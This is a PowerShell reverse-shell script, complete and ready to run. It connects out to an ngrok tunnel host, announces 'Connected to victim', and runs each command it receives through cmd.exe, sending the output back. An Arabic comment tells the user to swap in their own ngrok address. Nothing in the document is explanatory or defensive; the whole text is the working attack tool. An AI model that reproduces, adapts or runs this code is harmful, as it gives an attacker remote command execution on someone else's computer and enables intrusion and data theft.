$RemoteHost = "8.tcp.ngrok.io"  # استبدل بـ ngrok الصحيح
$Port = 10577

try {
    $Socket = New-Object Net.Sockets.TcpClient($RemoteHost, $Port)
    $Stream = $Socket.GetStream()
    $Writer = New-Object IO.StreamWriter($Stream)
    $Writer.AutoFlush = $true
    $Buffer = New-Object System.Byte[] 1024
    $Encoding = New-Object Text.ASCIIEncoding
    $Writer.WriteLine("Connected to victim")

    while ($Socket.Connected) {
        $Bytes = $Stream.Read($Buffer, 0, $Buffer.Length)
        if ($Bytes -gt 0) {
            $Command = $Encoding.GetString($Buffer, 0, $Bytes - 1)
            if ($Command -eq "exit") {
                $Socket.Close()
            } else {
                $Output = cmd.exe /c $Command 2>&1 | Out-String
                $Writer.WriteLine($Output)
            }
        }
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)"
}
